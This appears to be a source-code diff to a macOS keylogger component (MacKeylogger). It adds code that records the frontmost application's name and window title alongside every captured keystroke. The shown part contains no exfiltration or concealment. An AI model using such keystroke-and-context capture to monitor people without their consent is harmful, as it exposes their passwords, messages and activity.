@@ -1,6 +1,7 @@
 #ifdef __APPLE__
 
 #include <Carbon/Carbon.h>
+#import <Cocoa/Cocoa.h>
 
 #include <chrono>
 #include <cstdio>
@@ -97,6 +98,83 @@ static std::string translateKeyCode(CGKeyCode keyCode) {
     return buf;
 }
 
+// ---- active window info ----------------------------------------------------
+
+struct WindowInfo { std::string app; std::string title; };
+
+static WindowInfo getActiveWindowInfo() {
+    WindowInfo info;
+    @autoreleasepool {
+        NSRunningApplication* front =
+            [[NSWorkspace sharedWorkspace] frontmostApplication];
+        if (!front) return info;
+
+        if (front.localizedName)
+            info.app = [front.localizedName UTF8String];
+
+        pid_t pid = front.processIdentifier;
+        CFArrayRef windowList = CGWindowListCopyWindowInfo(
+            kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements,
+            kCGNullWindowID);
+        if (!windowList) return info;
+
+        CFIndex count = CFArrayGetCount(windowList);
+        for (CFIndex i = 0; i < count; ++i) {
+            auto dict = (CFDictionaryRef)CFArrayGetValueAtIndex(windowList, i);
+
+            CFNumberRef pidRef = (CFNumberRef)CFDictionaryGetValue(
+                dict, kCGWindowOwnerPID);
+            if (!pidRef) continue;
+            int winPid = 0;
+            CFNumberGetValue(pidRef, kCFNumberIntType, &winPid);
+            if (winPid != pid) continue;
+
+            CFNumberRef layerRef = (CFNumberRef)CFDictionaryGetValue(
+                dict, kCGWindowLayer);
+            if (layerRef) {
+                int layer = 0;
+                CFNumberGetValue(layerRef, kCFNumberIntType, &layer);
+                if (layer != 0) continue;
+            }
+
+            CFStringRef nameRef = (CFStringRef)CFDictionaryGetValue(
+                dict, kCGWindowName);
+            if (nameRef) {
+                char buf[512];
+                if (CFStringGetCString(nameRef, buf, sizeof(buf),
+                                       kCFStringEncodingUTF8))
+                    info.title = buf;
+            }
+            break;
+        }
+        CFRelease(windowList);
+    }
+    return info;
+}
+
+static WindowInfo getCachedWindowInfo() {
+    static pid_t lastPID = -1;
+    static WindowInfo cached;
+    static auto lastRefresh = std::chrono::steady_clock::time_point{};
+
+    @autoreleasepool {
+        NSRunningApplication* front =
+            [[NSWorkspace sharedWorkspace] frontmostApplication];
+        pid_t currentPID = front ? front.processIdentifier : -1;
+
+        auto now = std::chrono::steady_clock::now();
+        bool pidChanged = (currentPID != lastPID);
+        bool stale = (now - lastRefresh) > std::chrono::milliseconds(500);
+
+        if (pidChanged || stale) {
+            cached = getActiveWindowInfo();
+            lastPID = currentPID;
+            lastRefresh = now;
+        }
+    }
+    return cached;
+}
+
 // ---- tap callback ----------------------------------------------------------
 
 CGEventRef MacKeylogger::tapCallback(CGEventTapProxy, CGEventType type,
@@ -121,6 +199,10 @@ CGEventRef MacKeylogger::tapCallback(CGEventTapProxy, CGEventType type,
         std::chrono::duration_cast<std::chrono::milliseconds>(
             std::chrono::system_clock::now().time_since_epoch()).count());
     ev.keyDown = (type == kCGEventKeyDown);
+
+    auto wi = getCachedWindowInfo();
+    ev.appName     = std::move(wi.app);
+    ev.windowTitle = std::move(wi.title);
 
     {
         std::lock_guard<std::mutex> lk(self->m_mu);
